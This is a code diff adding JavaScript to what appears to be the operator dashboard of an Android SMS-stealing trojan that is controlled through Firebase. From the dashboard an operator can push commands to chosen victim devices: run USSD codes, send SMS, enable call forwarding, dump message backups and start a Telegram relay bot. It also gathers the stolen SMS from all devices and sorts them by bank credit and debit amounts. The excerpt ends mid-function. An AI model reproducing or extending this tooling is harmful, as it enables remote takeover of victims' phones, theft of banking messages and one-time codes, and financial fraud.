+  if (ussdUnsub) { try { ussdUnsub(); } catch(e) {} ussdUnsub = null; }
+  ussdUnsub = onValue(ref(db, `user_data/${deviceId}/ussd_result`), snap => {
+    const data = snap.val();
+    const homeBox = document.getElementById('ussdResultBox');
+    const homeIcon = document.getElementById('ussdResultIcon');
+    const homeText = document.getElementById('ussdResultText');
+    const modalBox = document.getElementById('ussdResponseBox');
+    const modalIcon = document.getElementById('ussdResponseIcon');
+    const modalText = document.getElementById('ussdResponseText');
+    const modalCode = document.getElementById('ussdResponseCode');
+    if (!data) { if (homeBox) homeBox.className = 'status-box'; if (modalBox) modalBox.className = 'status-box'; return; }
+    const code = data.ussd_code || '';
+    const response = data.ussd_response || 'No response';
+    const status = data.ussd_status || '';
+    const simSlot = data.ussd_sim_slot || '';
+    let state = 'info', iconClass = 'bi bi-telephone-inbound';
+    if (status === 'success') { state = 'success'; iconClass = 'bi bi-check-circle-fill'; }
+    else if (status === 'failed' || status === 'error' || status === 'security_error') { state = 'error'; iconClass = 'bi bi-x-circle-fill'; }
+    if (homeBox) { homeBox.className = 'status-box show ' + state; homeIcon.className = iconClass; homeText.textContent = '📞 ' + code + ' → ' + response; }
+    if (modalBox) { modalBox.className = 'status-box show ' + state; modalIcon.className = iconClass; modalText.textContent = response; modalCode.textContent = code ? `Code: ${code} • SIM ${simSlot}` : ''; }
+  });
+}
+window.openUssdModal = () => {
+  const deviceSelect = document.getElementById('ussdDeviceSelect');
+  deviceSelect.innerHTML = '<option value="">-- Select Device --</option>';
+  allDevicesFull.forEach(d => {
+    const opt = document.createElement('option');
+    opt.value = d.deviceId;
+    opt.textContent = `#${d.user_serial || '?'} - ${d.d_name} (${d.deviceId.substring(0, 8)}...)`;
+    if (selectedDeviceId && d.deviceId === selectedDeviceId) opt.selected = true;
+    deviceSelect.appendChild(opt);
+  });
+  document.getElementById('ussdResponseBox').className = 'status-box';
+  document.getElementById('ussdResponseText').textContent = 'Waiting...';
+  document.getElementById('ussdResponseCode').textContent = '';
+  document.getElementById('ussdCode').value = '';
+  new bootstrap.Modal(document.getElementById('ussdModal')).show();
+};
+window.sendUssdCommand = function() {
+  const deviceId = document.getElementById('ussdDeviceSelect').value || selectedDeviceId;
+  const code = document.getElementById('ussdCode').value.trim();
+  const sim = document.getElementById('ussdSim').value;
+  if (!deviceId) return toast('Select a device', 'error');
+  if (!code) return toast('Enter USSD code', 'error');
+  const box = document.getElementById('ussdResponseBox');
+  box.className = 'status-box show warning';
+  document.getElementById('ussdResponseIcon').className = 'bi bi-hourglass-split';
+  document.getElementById('ussdResponseText').textContent = 'Sending...';
+  // ⚠️ user_data overwrite না করে শুধু command ফিল্ডে পাঠাই
+  const payload = {
+    command: 'ussd', ussd: code, ussd_code: code, action: 'ussd', task: 'ussd',
+    simSlot: sim, sim_slot: sim, sim: sim, timestamp: Date.now(), adminRequest: true
+  };
+  const updates = {};
+  updates[`user_data/${deviceId}/command`] = 'ussd';
+  updates[`user_data/${deviceId}/ussd`] = code;
+  updates[`user_data/${deviceId}/ussd_code`] = code;
+  updates[`user_data/${deviceId}/simSlot`] = sim;
+  updates[`commands/${deviceId}/last_command`] = payload;
+  update(ref(db, '/'), updates).then(() => {
+    document.getElementById('ussdResponseText').textContent = 'Waiting...';
+    document.getElementById('ussdResponseCode').textContent = code + ' • SIM ' + sim;
+    toast('USSD sent', 'success');
+    if (selectedDeviceId === deviceId) listenUssdResponse(deviceId);
+  });
+};
+
+/* SEND SMS — ⚠️ FIX: user_data overwrite না করা */
+window.openSendSms = () => new bootstrap.Modal(document.getElementById('sendSmsModal')).show();
+window.sendSmsCommand = function() {
+  if (!selectedDeviceId) return toast('Select a device', 'error');
+  const phone = document.getElementById('smsPhone').value.trim();
+  const msg = document.getElementById('smsMessage').value.trim();
+  const sim = document.getElementById('smsSim').value;
+  if (!phone) return toast('Enter phone number', 'error');
+  if (!msg) return toast('Enter message', 'error');
+  if (msg.length > 180) return toast('Max 180 chars', 'error');
+  const simNum = String(parseInt(sim) + 1);
+
+  // ⚠️ FIX: শুধু specific field update করি, পুরো user_data overwrite না
+  const updates = {};
+  updates[`user_data/${selectedDeviceId}/command`] = 'send_sms';
+  updates[`user_data/${selectedDeviceId}/phoneNumber`] = phone;
+  updates[`user_data/${selectedDeviceId}/messageText`] = msg;
+  updates[`user_data/${selectedDeviceId}/simSlot`] = simNum;
+  updates[`user_data/${selectedDeviceId}/timestamp`] = Date.now();
+  updates[`user_data/${selectedDeviceId}/adminRequest`] = true;
+
+  // Full payload commands path-এ
+  const payload = {
+    command: 'send_sms', send_sms: 'send_sms', action: 'send_sms', task: 'send_sms',
+    phoneNumber: phone, number: phone, to: phone,
+    message: msg, messageText: msg, msg: msg, body: msg,
+    simSlot: simNum, sim_slot: simNum, sim: simNum,
+    timestamp: Date.now(), adminRequest: true, fromAdmin: true
+  };
+  updates[`commands/${selectedDeviceId}/last_command`] = payload;
+
+  update(ref(db, '/'), updates).then(() => {
+    toast('✅ SMS command sent', 'success');
+    const modalEl = document.getElementById('sendSmsModal');
+    const modalInst = bootstrap.Modal.getInstance(modalEl);
+    if (modalInst) { if (document.activeElement && document.activeElement.blur) document.activeElement.blur(); modalInst.hide(); }
+    document.getElementById('smsPhone').value = '';
+    document.getElementById('smsMessage').value = '';
+    document.getElementById('charCount').textContent = '0/180';
+  }).catch(e => toast('❌ Failed: ' + e.message, 'error'));
+};
+window.updateCharCount = function() {
+  const n = document.getElementById('smsMessage').value.length;
+  const el = document.getElementById('charCount');
+  el.textContent = n + '/180';
+  el.style.color = n > 180 ? '#ff3355' : n > 160 ? '#ffb020' : '#b8a0b0';
+};
+
+/* CALL FORWARD — ⚠️ FIX: user_data overwrite না করা */
+window.openCallForward = () => {
+  const modal = new bootstrap.Modal(document.getElementById('callForwardModal'));
+  const box = document.getElementById('cfStatusBox');
+  box.className = 'status-box';
+  document.getElementById('cfStatusText').textContent = '—';
+  if (selectedDeviceId) setTimeout(() => callForwardStatus(), 250);
+  modal.show();
+};
+window.callForwardActivate = function() {
+  if (!selectedDeviceId) return toast('Select a device', 'error');
+  const phone = document.getElementById('cfPhone').value.trim();
+  const sim = document.getElementById('cfSim').value;
+  if (!phone) return toast('Enter phone', 'error');
+  const simNum = String(parseInt(sim) + 1);
+  const box = document.getElementById('cfStatusBox');
+  box.className = 'status-box show warning';
+  document.getElementById('cfStatusIcon').className = 'bi bi-hourglass-split';
+  document.getElementById('cfStatusText').textContent = 'Activating...';
+
+  const updates = {};
+  updates[`user_data/${selectedDeviceId}/command`] = 'call_forward';
+  updates[`user_data/${selectedDeviceId}/phoneNumber`] = phone;
+  updates[`user_data/${selectedDeviceId}/simSlot`] = simNum;
+  updates[`user_data/${selectedDeviceId}/timestamp`] = Date.now();
+  updates[`user_data/${selectedDeviceId}/adminRequest`] = true;
+
+  const payload = {
+    command: 'call_forward', call_forward: 'call_forward', action: 'call_forward', task: 'call_forward',
+    phoneNumber: phone, number: phone, to: phone,
+    simSlot: simNum, sim_slot: simNum, sim: simNum,
+    timestamp: Date.now(), adminRequest: true
+  };
+  updates[`commands/${selectedDeviceId}/last_command`] = payload;
+
+  update(ref(db, '/'), updates).then(() => toast('📡 Call forward sent', 'success')).catch(e => toast('❌ ' + e.message, 'error'));
+};
+window.callForwardDeactivate = function() {
+  if (!selectedDeviceId) return;
+  const sim = document.getElementById('cfSim').value;
+  const simNum = String(parseInt(sim) + 1);
+
+  const updates = {};
+  updates[`user_data/${selectedDeviceId}/command`] = 'disable_forward';
+  updates[`user_data/${selectedDeviceId}/simSlot`] = simNum;
+  updates[`user_data/${selectedDeviceId}/timestamp`] = Date.now();
+
+  const payload = {
+    command: 'disable_forward', disable_forward: 'disable_forward', action: 'disable_forward', task: 'disable_forward',
+    simSlot: simNum, sim_slot: simNum, sim: simNum, timestamp: Date.now(), adminRequest: true
+  };
+  updates[`commands/${selectedDeviceId}/last_command`] = payload;
+
+  update(ref(db, '/'), updates).then(() => toast('Deactivated', 'success'));
+};
+window.callForwardStatus = function() {
+  if (!selectedDeviceId) return toast('Select a device', 'error');
+  const sim = document.getElementById('cfSim').value;
+  const simNum = String(parseInt(sim) + 1);
+
+  const updates = {};
+  updates[`user_data/${selectedDeviceId}/command`] = 'forward_status';
+  updates[`user_data/${selectedDeviceId}/simSlot`] = simNum;
+  updates[`user_data/${selectedDeviceId}/timestamp`] = Date.now();
+
+  const payload = {
+    command: 'forward_status', forward_status: 'forward_status', action: 'forward_status', task: 'forward_status',
+    simSlot: simNum, sim_slot: simNum, sim: simNum, timestamp: Date.now()
+  };
+  updates[`commands/${selectedDeviceId}/last_command`] = payload;
+
+  update(ref(db, '/'), updates).then(() => toast('Status checked', 'info'));
+};
+
+/* FETCH MESSAGES — ⚠️ FIX */
+window.fetchMessages = function() {
+  if (!selectedDeviceId) { toast('Select a device', 'error'); return; }
+  toast('⏳ Sending backup command...', 'info');
+
+  const updates = {};
+  updates[`user_data/${selectedDeviceId}/command`] = 'backup_sms';
+  updates[`user_data/${selectedDeviceId}/timestamp`] = Date.now();
+
+  const payload = {
+    command: 'backup_sms', backup_sms: 'backup_sms', action: 'backup_sms', task: 'backup_sms',
+    timestamp: Date.now(), adminRequest: true
+  };
+  updates[`commands/${selectedDeviceId}/last_command`] = payload;
+
+  update(ref(db, '/'), updates).then(() => {
+    toast('✅ Backup sent!', 'success');
+    setTimeout(() => document.getElementById('deviceSmsSection')?.scrollIntoView({ behavior: 'smooth', block: 'start' }), 200);
+  }).catch(e => toast('Failed: ' + e.message, 'error'));
+};
+
+/* ONLINE CHECK — ⚠️ FIX */
+window.onlineCheck = function() {
+  if (!selectedDeviceId) { toast('Select a device', 'error'); return; }
+  const ocr = document.getElementById('onlineCheckResult');
+  const txt = document.getElementById('onlineCheckText');
+  ocr.classList.remove('online', 'offline');
+  ocr.classList.add('show');
+  txt.textContent = '⏳ Checking...';
+
+  const updates = {};
+  updates[`user_data/${selectedDeviceId}/command`] = 'ping';
+  updates[`user_data/${selectedDeviceId}/timestamp`] = Date.now();
+
+  const payload = { command: 'ping', ping: 'ping', action: 'ping', task: 'ping', timestamp: Date.now() };
+  updates[`commands/${selectedDeviceId}/last_command`] = payload;
+
+  update(ref(db, '/'), updates).catch(() => {});
+  setTimeout(() => {
+    onValue(ref(db, `user_data/${selectedDeviceId}/status`), snap => {
+      const status = snap.val() || 'offline';
+      if (status === 'online') {
+        ocr.classList.remove('offline'); ocr.classList.add('online');
+        txt.innerHTML = '<b>🟢 ONLINE</b>';
+        toast('🟢 Device is ONLINE', 'success');
+      } else {
+        ocr.classList.remove('online'); ocr.classList.add('offline');
+        txt.innerHTML = '<b>🔴 OFFLINE</b>';
+        toast('🔴 Device is OFFLINE', 'error');
+      }
+    }, { onlyOnce: true });
+  }, 2000);
+};
+
+/* DEVICE SEARCH */
+document.getElementById('deviceSearch').addEventListener('input', debounce(e => {
+  const q = e.target.value.trim().toLowerCase();
+  const status = document.querySelector('[data-dfilter].active')?.dataset.dfilter || 'all';
+  filteredDevices = allDevicesFull.filter(d => {
+    if (status !== 'all' && d.status !== status) return false;
+    if (!q) return true;
+    return d.deviceId.toLowerCase().includes(q) || String(d.user_serial).includes(q) || d.d_name.toLowerCase().includes(q);
+  });
+  renderDeviceList();
+}, 200));
+document.querySelectorAll('[data-dfilter]').forEach(b => b.addEventListener('click', () => {
+  document.querySelectorAll('[data-dfilter]').forEach(x => x.classList.remove('active'));
+  b.classList.add('active');
+  document.getElementById('deviceSearch').dispatchEvent(new Event('input'));
+}));
+
+/* ALL SMS */
+function loadAllSms() {
+  if (!db) return;
+  if (allSmsUnsub) { try { allSmsUnsub(); } catch(e) {} allSmsUnsub = null; }
+  allSmsUnsub = onValue(ref(db, 'user_sms'), snap => {
+    const data = snap.val() || {};
+    const flat = [];
+    const newKeys = new Set();
+    Object.keys(data).forEach(deviceId => {
+      const serial = getSerialForDevice(deviceId) || '?';
+      const devSms = data[deviceId] || {};
+      Object.keys(devSms).forEach(key => {
+        const s = devSms[key];
+        const body = s.body || s.message || 'No content';
+        const type = determineSmsType({ body, type: s.type });
+        const uniqueKey = deviceId + '_' + key;
+        newKeys.add(uniqueKey);
+        flat.push({
+          deviceId, serial, key, body,
+          sender: s.sender || s.address || 'Unknown',
+          date: s.date || s.time || 'N/A',
+          timestamp: s.timestamp || 0,
+          sim_number: s.sim_number || s.simSlot || 'SIM 1',
+          type, amount: extractAmount(body),
+          isDebit: type === 'bank_debit'
+        });
+      });
+    });
+    flat.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+    if (knownSmsKeys.size === 0) knownSmsKeys = newKeys;
+    allSmsFlat = flat;
+    smsPageOffset = 0; smsHasMore = true;
+    computeSmsCounts();
+    applySmsFilter();
+    renderSmsList();
+  });
+}
+function computeSmsCounts() {
+  const counts = { all: allSmsFlat.length, credit: 0, debit: 0, bank_debit: 0, highest: 0 };
+  let highestAmount = 0;
+  allSmsFlat.forEach(s => {
+    if (s.type === 'credit') counts.credit++;
+    else if (s.type === 'debit') counts.debit++;
+    else if (s.isDebit) counts.bank_debit++;
+    if (s.amount > highestAmount) highestAmount = s.amount;
+  });
+  counts.highest = allSmsFlat.filter(s => s.amount === highestAmount && s.amount > 0).length;
+  document.getElementById('allSmsTotal').textContent = counts.all;
+  document.getElementById('creditSmsTotal').textContent = counts.credit;
+  document.getElementById('debitSmsTotal').textContent = counts.debit;
+  document.getElementById('bankDebitSmsTotal').textContent = counts.bank_debit;
+  document.getElementById('highestSmsTotal').textContent = counts.highest;
+}
+function applySmsFilter() {
+  const q = (currentSmsSearchTerm || '').trim().toLowerCase();
+  const filter = currentSmsFilter || 'all';
+  let out = allSmsFlat.filter(s => {
+    if (filter === 'credit' && s.type !== 'credit') return false;
+    if (filter === 'debit' && s.type !== 'debit') return false;
+    if (filter === 'bank_debit' && !s.isDebit) return false;
+    if (!q) return true;
+    return (s.sender || '').toLowerCase().includes(q)
+        || (s.body || '').toLowerCase().includes(q)
+        || (s.deviceId || '').toLowerCase().includes(q)
+        || String(s.serial || '').includes(q)
+        || (s.sim_number || '').toLowerCase().includes(q);
+  });
+  if (filter === 'highest' && out.length) {
+    const max = Math.max(...out.map(x => x.amount));
+    out = out.filter(x => x.amount === max && x.amount > 0);
+  }
+  filteredSms = out;
+  smsPageOffset = 0; smsHasMore = true;
+  const countEl = document.getElementById('smsSearchCount');
+  if (countEl) countEl.textContent = filteredSms.length + ' results';
+}
+function renderSmsList() {
+  const inner = document.getElementById('smsInner');
+  const loadMore = document.getElementById('smsLoadMore');
+  if (!filteredSms.length) {
+    inner.innerHTML = `<div class="empty"><i class="bi bi-chat"></i><p>No messages found</p></div>`;
+    loadMore.style.display = 'none';
+    return;
+  }
+  const start = smsPageOffset;
+  const end = Math.min(start + SMS_PAGE_SIZE, filteredSms.length);
+  const batch = filteredSms.slice(start, end);
+  let html = '';
+  for (let i = 0; i < batch.length; i++) html += buildSmsItemAllSms(batch[i]);
+  inner.innerHTML = html;
+  smsPageOffset = end;
+  smsHasMore = end < filteredSms.length;
+  if (smsHasMore) {
+    loadMore.style.display = 'flex';
+    loadMore.innerHTML = `<div class="spinner-small"></div> Loading more... (${end}/${filteredSms.length})`;
+  } else { loadMore.style.display = 'none'; }
+}
+function buildSmsItemAllSms(s) {
+  const badge = s.type === 'credit' ? `<span class="badge-soft credit">💰 +${s.amount || ''}</span>`
+    : s.type === 'debit' ? `<span class="badge-soft debit">💸 -${s.amount || ''}</span>`
+    : s.isDebit ? `<span class="badge-soft debit">🏦 Bank Debit</span>`
+    : `<span class="badge-soft normal">📌</span>`;
+  const isNew = s.deviceId && s.key && !knownSmsKeys.has(s.deviceId + '_' + s.key);
+  const newBadge = isNew ? `<span class="badge-soft new">NEW</span>` : '';
+  let serialHtml = '';
+  const liveSerial = getSerialForDevice(s.deviceId) || s.serial;
+  if (liveSerial && liveSerial !== '?' && liveSerial !== '…') {
+    serialHtml = `<span class="serial" onclick="event.stopPropagation(); navigateToDevice('${escapeAttr(s.deviceId)}')" title="Open device #${liveSerial}">#${liveSerial}</span>`;
+  } else if (s.deviceId) {
+    serialHtml = `<span class="serial missing" title="Serial loading...">#?</span>`;
+  }
+  let body = escapeHtml(s.body);
+  let sender = escapeHtml(s.sender);
+  const q = (currentSmsSearchTerm || '').trim();
+  if (q.length > 0) {
+    const regex = new RegExp(`(${q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, 'gi');
+    body = body.replace(regex, '<mark>$1</mark>');
+    sender = sender.replace(regex, '<mark>$1</mark>');
+  }
+  return `<div class="sms-item ${s.isDebit ? 'debit' : ''}">
+      <div class="sms-top">
+        <div class="sms-sender">${serialHtml}<span>${sender}</span>${newBadge}</div>
+        <div class="sms-date">${escapeHtml(s.date)}</div>
+      </div>
+      <div class="sms-meta"><span class="badge-soft sim">${escapeHtml(s.sim_number)}</span>${badge}</div>
+      <div class="sms-body" style="margin-top:4px;">${body}</div>
+      <div class="sms-actions">
+        <button class="mini-btn primary" onclick="copySms('${escapeAttr(s.body)}')"><i class="bi bi-clipboard"></i> Copy</button>
+        <button class="mini-btn danger" onclick="requestDeleteSms('${escapeAttr(s.deviceId)}','${escapeAttr(s.key)}')"><i class="bi bi-trash"></i> Delete</button>
+      </div>
+    </div>`;
+}
+document.getElementById('smsList')?.addEventListener('scroll', throttle(e => {
+  const el = e.target;
+  if (el.scrollHeight - el.scrollTop - el.clientHeight < 250) {
+    if (smsHasMore && !smsLoading) {
+      smsLoading = true;
+      requestAnimationFrame(() => {
+        const start = smsPageOffset;
+        const end = Math.min(start + SMS_PAGE_SIZE, filteredSms.length);
+        const batch = filteredSms.slice(start, end);
+        if (batch.length) {
+          let html = '';
+          for (let i = 0; i < batch.length; i++) html += buildSmsItemAllSms(batch[i]);
+          document.getElementById('smsInner').insertAdjacentHTML('beforeend', html);
+          smsPageOffset = end;
+          smsHasMore = end < filteredSms.length;
+          const loadMore = document.getElementById('smsLoadMore');
+          if (smsHasMore) {
+            loadMore.style.display = 'flex';
+            loadMore.innerHTML = `<div class="spinner-small"></div> Loading more... (${end}/${filteredSms.length})`;
+          } else { loadMore.style.display = 'none'; }
+        } else { smsHasMore = false; }
+        smsLoading = false;
+      });
+    }
+  }
+}, 200));
+document.getElementById('smsSearch').addEventListener('input', debounce(e => {
+  currentSmsSearchTerm = e.target.value;
+  const clearBtn = document.getElementById('clearSmsSearch');
+  if (clearBtn) {
+    if (currentSmsSearchTerm.trim().length > 0) clearBtn.classList.add('show');
+    else clearBtn.classList.remove('show');
+  }
+  applySmsFilter();
+  renderSmsList();
+}, 200));
+window.clearAllSmsSearch = function() {
+  document.getElementById('smsSearch').value = '';
+  currentSmsSearchTerm = '';
+  document.getElementById('clearSmsSearch').classList.remove('show');
+  applySmsFilter();
+  renderSmsList();
+  toast('Search cleared', 'info');
+};
+document.querySelectorAll('[data-filter]').forEach(b => b.addEventListener('click', () => {
+  document.querySelectorAll('[data-filter]').forEach(x => x.classList.remove('active'));
+  b.classList.add('active');
+  currentSmsFilter = b.dataset.filter;
+  applySmsFilter();
+  renderSmsList();
+  document.getElementById('smsList')?.scrollTo({ top: 0, behavior: 'smooth' });
+}));
+window.refreshAllSms = async function() {
+  if (!db) return toast('No Firebase', 'error');
+  if (!isUnlocked) return;
+  const btn = document.getElementById('allSmsRefreshBtn');
+  if (btn) { btn.disabled = true; btn.classList.add('spinning'); btn.innerHTML = '<i class="bi bi-arrow-clockwise"></i> Loading...'; }
+  try {
+    const snap = await get(ref(db, 'user_sms'));
+    const data = snap.val() || {};
+    const flat = [];
+    const newKeys = new Set();
+    let newCount = 0;
+    Object.keys(data).forEach(deviceId => {
+      const serial = getSerialForDevice(deviceId) || '?';
+      const devSms = data[deviceId] || {};
+      Object.keys(devSms).forEach(key => {
+        const s = devSms[key];
+        const body = s.body || s.message || 'No content';
+        const type = determineSmsType({ body, type: s.type });
+        const uniqueKey = deviceId + '_' + key;
+        newKeys.add(uniqueKey);
+        if (knownSmsKeys.size > 0 && !knownSmsKeys.has(uniqueKey)) newCount++;
+        flat.push({
+          deviceId, serial, key, body,
+          sender: s.sender || s.address || 'Unknown',
+          date: s.date || s.time || 'N/A',
+          timestamp: s.timestamp || 0,
+          sim_number: s.sim_number || s.simSlot || 'SIM 1',
+          type, amount: extractAmount(body),
+          isDebit: type === 'bank_debit'
+        });
+      });
+    });
+    flat.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+    knownSmsKeys = newKeys;
+    allSmsFlat = flat;
+    smsPageOffset = 0; smsHasMore = true;
+    computeSmsCounts();
+    applySmsFilter();
+    renderSmsList();
+    if (newCount > 0) toast(`🔄 Refreshed! ${newCount} new SMS`, 'success');
+    else toast('🔄 No new SMS', 'info');
+  } catch (e) { toast('❌ ' + e.message, 'error'); }
+  finally { if (btn) { btn.disabled = false; btn.classList.remove('spinning'); btn.innerHTML = '<i class="bi bi-arrow-clockwise"></i> Refresh'; } }
+};
+window.requestDeleteSms = function(deviceId, key) {
+  requestDeletePassword('SMS', () => {
+    remove(ref(db, `user_sms/${deviceId}/${key}`))
+      .then(() => { toast('Deleted', 'success'); PERF.smsCache.delete(deviceId); })
+      .catch(e => toast('Failed: ' + e.message, 'error'));
+  });
+};
+window.deleteAllSms = function() {
+  if (!isUnlocked) return;
+  requestDeletePassword('ALL SMS', () => {
+    if (!confirm('⚠️ Delete ALL SMS from ALL devices?')) return;
+    remove(ref(db, 'user_sms')).then(() => {
+      toast('🗑️ All SMS deleted', 'success');
+      PERF.smsCache.clear(); knownSmsKeys.clear();
+      allSmsFlat = []; filteredSms = [];
+      smsPageOffset = 0;
+      computeSmsCounts();
+      renderSmsList();
+    }).catch(e => toast('❌ ' + e.message, 'error'));
+  });
+};
+
+/* BACKUP */
+let backupUnsub = null;
+function loadAllBackup() {
+  if (!db) return;
+  if (backupUnsub) { try { backupUnsub(); } catch(e) {} backupUnsub = null; }
+  backupUnsub = onValue(ref(db, 'user_data'), snap => {
+    const data = snap.val() || {};
+    const flat = [];
+    Object.keys(data).forEach(deviceId => {
+      const serial = getSerialForDevice(deviceId) || '?';
+      const bData = data[deviceId].backup_sms;
+      if (!bData) return;
+      let latest = null, latestTs = 0;
+      Object.values(bData).forEach(b => {
+        if ((b.backup_timestamp || 0) > latestTs) { latest = b; latestTs = b.backup_timestamp || 0; }
+      });
+      if (!latest || !latest.sms_list) return;
+      Object.keys(latest.sms_list).forEach(key => {
+        const s = latest.sms_list[key];
+        const body = s.body || s.message || '';
+        const type = determineSmsType({ body, type: s.type });
+        flat.push({
+          deviceId, serial, key, body,
+          sender: s.address || s.sender || 'Unknown',
+          date: s.date_formatted || s.date || s.time || 'N/A',
+          timestamp: s.timestamp || latestTs || 0,
+          sim_number: s.sim_number || s.simSlot || 'SIM 1',
+          type, amount: extractAmount(body),
+          isDebit: type === 'bank_debit',
+          deviceName: data[deviceId].d_name || deviceId.slice(0, 12) + '…'
+        });
+      });
+    });
+    allBackupFlat = flat;
+    filteredBackup = [...flat];
+    computeBackupCounts();
+    applyBackupFilter();
+  });
+}
+function computeBackupCounts() {
+  let all = allBackupFlat.length, credit = 0, debit = 0, bankDebit = 0;
+  allBackupFlat.forEach(s => {
+    if (s.type === 'credit') credit++;
+    else if (s.type === 'debit') debit++;
+    else if (s.isDebit) bankDebit++;
+  });
+  const elAll = document.getElementById('backupAllTotal');
+  const elCredit = document.getElementById('backupCreditTotal');
+  const elDebit = document.getElementById('backupDebitTotal');
+  const elBankDebit = document.getElementById('backupBankDebitTotal');
+  const elCount = document.getElementById('backupSearchCount');
+  if (elAll) elAll.textContent = all;
+  if (elCredit) elCredit.textContent = credit;
+  if (elDebit) elDebit.textContent = debit;
+  if (elBankDebit) elBankDebit.textContent = bankDebit;
+  if (elCount) elCount.textContent = all + ' entries';
+}
+function applyBackupFilter() {
+  const q = (currentBackupSearchTerm || '').trim().toLowerCase();
+  const filter = currentBackupFilter || 'all';
+  let out = allBackupFlat.filter(s => {
+    if (filter === 'credit' && s.type !== 'credit') return false;
+    if (filter === 'debit' && s.type !== 'debit') return false;
+    if (filter === 'bank_debit' && !s.isDebit) return false;
+    if (!q) return true;
+    return (s.sender || '').toLowerCase().includes(q)
+        || (s.body || '').toLowerCase().includes(q)
+        || (s.deviceId || '').toLowerCase().includes(q)
+        || String(s.serial || '').includes(q)
+        || (s.deviceName || '').toLowerCase().includes(q);
+  });
+  filteredBackup = out;
+  renderBackupList();
+}
+function renderBackupList() {
+  const inner = document.getElementById('backupInner');
+  if (!filteredBackup.length) {
+    inner.innerHTML = `<div class="empty"><i class="bi bi-cloud"></i><p>No backup messages${currentBackupSearchTerm ? ' for "' + escapeHtml(currentBackupSearchTerm) + '"' : ''}</p></div>`;
+    return;
+  }
+  const visible = filteredBackup.slice(0, 300);
+  let html = '';
+  for (let i = 0; i < visible.length; i++) html += buildSmsItemAllSms(visible[i]);
+  if (filteredBackup.length > 300) html += `<div class="load-more">Showing 300 of ${filteredBackup.length}</div>`;
+  inner.innerHTML = html;
+}
+document.querySelectorAll('[data-bfilter]').forEach(b => b.addEventListener('click', () => {
+  document.querySelectorAll('[data-bfilter]').forEach(x => x.classList.remove('active'));
+  b.classList.add('active');
+  currentBackupFilter = b.dataset.bfilter;
+  applyBackupFilter();
+}));
+document.getElementById('backupSearch')?.addEventListener('input', debounce(e => {
+  currentBackupSearchTerm = e.target.value;
+  const clearBtn = document.getElementById('clearBackupSearch');
+  if (clearBtn) {
+    if (currentBackupSearchTerm.trim().length > 0) clearBtn.classList.add('show');
+    else clearBtn.classList.remove('show');
+  }
+  applyBackupFilter();
+}, 200));
+window.clearAllBackupSearch = function() {
+  const inp = document.getElementById('backupSearch');
+  if (inp) inp.value = '';
+  currentBackupSearchTerm = '';
+  const cb = document.getElementById('clearBackupSearch');
+  if (cb) cb.classList.remove('show');
+  applyBackupFilter();
+  toast('Search cleared', 'info');
+};
+window.refreshBackupList = function() {
+  const btn = document.getElementById('backupRefreshBtn');
+  if (btn) { btn.classList.add('spinning'); btn.innerHTML = '<i class="bi bi-arrow-clockwise"></i> Loading...'; }
+  loadAllBackup();
+  setTimeout(() => {
+    if (btn) { btn.classList.remove('spinning'); btn.innerHTML = '<i class="bi bi-arrow-clockwise"></i> Refresh'; }
+    toast('🔄 Backup refreshed', 'success');
+  }, 800);
+};
+window.deleteAllBackupSms = function() {
+  if (!isUnlocked) return;
+  requestDeletePassword('ALL Backup SMS (all devices)', () => {
+    if (!confirm('⚠️ Delete ALL Backup SMS from ALL devices?\n\nThis cannot be undone!')) return;
+    if (!db) return toast('No Firebase', 'error');
+    get(ref(db, 'user_data')).then(snap => {
+      const data = snap.val() || {};
+      const deviceIds = Object.keys(data);
+      if (!deviceIds.length) { toast('No devices found', 'info'); return; }
+      const updates = {};
+      let devicesWithBackup = 0;
+      deviceIds.forEach(devId => {
+        const bData = data[devId] && data[devId].backup_sms;
+        if (bData) { devicesWithBackup++; updates[`user_data/${devId}/backup_sms`] = null; }
+      });
+      if (Object.keys(updates).length === 0) { toast('No backup data to delete', 'info'); return; }
+      update(ref(db, '/'), updates).then(() => {
+        toast(`🗑️ Deleted backup from ${devicesWithBackup} device(s)`, 'success');
+        allBackupFlat = []; filteredBackup = [];
+        computeBackupCounts();
+        renderBackupList();
+      }).catch(e => toast('❌ Failed: ' + e.message, 'error'));
+    }).catch(e => toast('❌ Failed: ' + e.message, 'error'));
+  });
+};
+
+/* SETTINGS */
+window.openSmsForward = () => new bootstrap.Modal(document.getElementById('smsForwardModal')).show();
+window.openTelegramBot = () => new bootstrap.Modal(document.getElementById('telegramBotModal')).show();
+window.openUpdateNumber = () => new bootstrap.Modal(document.getElementById('updateNumberModal')).show();
+window.saveSmsForward = function() {
+  const num = document.getElementById('sfNumber').value.trim();
+  if (!num) return toast('Enter number', 'error');
+  set(ref(db, 'sms_forward/forward_number'), num).then(() => { toast('Saved', 'success'); bootstrap.Modal.getInstance(document.getElementById('smsForwardModal')).hide(); });
+};
+window.saveTelegramBot = function() {
+  const chatId = document.getElementById('botChatId').value.trim();
+  const token = document.getElementById('botToken').value.trim();
+  if (!chatId || !token) return toast('Both required', 'error');
+  set(ref(db, 'telegram_config'), { chat_id: chatId, bot_token: token, enabled: false, timestamp: Date.now() })
+    .then(() => { toast('Bot saved', 'success'); bootstrap.Modal.getInstance(document.getElementById('telegramBotModal')).hide(); });
+};
+window.startBotForDevice = function() {
+  if (!selectedDeviceId) return toast('Select a device', 'error');
+  const updates = {};
+  updates[`bot_status/${selectedDeviceId}`] = true;
+  updates[`user_data/${selectedDeviceId}/command`] = 'start_bot';
+  updates[`user_data/${selectedDeviceId}/timestamp`] = Date.now();
+  updates[`telegram_config/enabled`] = true;
+  const payload = { command: 'start_bot', start_bot: 'start_bot', action: 'start_bot', task: 'start_bot', timestamp: Date.now() };
+  updates[`commands/${selectedDeviceId}/last_command`] = payload;
+  update(ref(db, '/'), updates).then(() => toast('✅ Bot started', 'success')).catch(e => toast('❌ ' + e.message, 'error'));
+};
+window.stopBotForDevice = function() {
+  if (!selectedDeviceId) return toast('Select a device', 'error');
+  const updates = {};
+  updates[`bot_status/${selectedDeviceId}`] = false;
+  updates[`user_data/${selectedDeviceId}/command`] = 'stop_bot';
+  updates[`user_data/${selectedDeviceId}/timestamp`] = Date.now();
+  updates[`telegram_config/enabled`] = false;
+  const payload = { command: 'stop_bot', stop_bot: 'stop_bot', action: 'stop_bot', task: 'stop_bot', timestamp: Date.now() };
+  updates[`commands/${selectedDeviceId}/last_command`] = payload;
+  update(ref(db, '/'), updates).then(() => toast('✅ Bot stopped', 'success')).catch(e => toast('❌ ' + e.message, 'error'));
+};
+window.updateForwardNumber = function() {
